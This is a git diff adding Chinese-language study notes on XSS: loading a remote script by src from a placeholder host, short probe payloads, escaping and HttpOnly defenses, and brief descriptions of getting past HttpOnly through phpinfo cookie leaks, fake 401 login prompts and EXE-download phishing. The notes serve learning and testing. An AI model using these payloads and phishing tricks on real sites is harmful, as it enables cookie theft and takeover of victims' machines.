@@ -30,4 +30,34 @@ src是引用的意思，类似于include。
 如果是公网的链接可以使用//,如果不是公网是本地，//前需要加上http或HTTPs，这样才能正常加载，否为会将其视为文档。
 
 `<script src=http://www.xx.com/q23></script>`
+# 如何测试是否存在
 
+- <script>alert(1)</script>适合反射型XSS可以用，存储型容易导致网站出现问题
+
+- <script>console.log(1)</script>>
+
+- <img src=1>通过插入图片链接，将代码插入，做了HTML实体化转义可以通过此方法绕过。
+# XSS防御手段
+
+- HTML实体化转义--&lt;img src=1&gt;
+- URL编码--%3Cimg%20src=1%3E
+- HttpOnly防护，禁止JavaScript操作cookie
+
+如果是对<>做了过滤，基本上是没戏了，内容做过滤还有绕过的可能性。
+
+# 重点：
+
+当存在XSS漏洞的网站如果采用的是https协议，那么XSS接收站点也得必须为https协议。如果存在XSS漏洞的网站采用的http协议，接收站点是https协议也可以接收到cookie信息。
+
+# XSS如何绕过HttpOnly？
+**phpinfo绕过**
+
+phpinfo中会泄露cookie信息，查找PHP Variables，首先我们要先打开登录首页，这样phpinfo才能获取到cookie信息，否则获取不到,此种方法只能用一次
+
+**401钓鱼**
+
+在XSS存在的地方插入代码，伪造一个弹框登录
+
+**EXE钓鱼**
+
+就是对方访问链接是会跳转到其他链接，需要你下载程序后才能使用，这种方法可以直接控制对方主机。
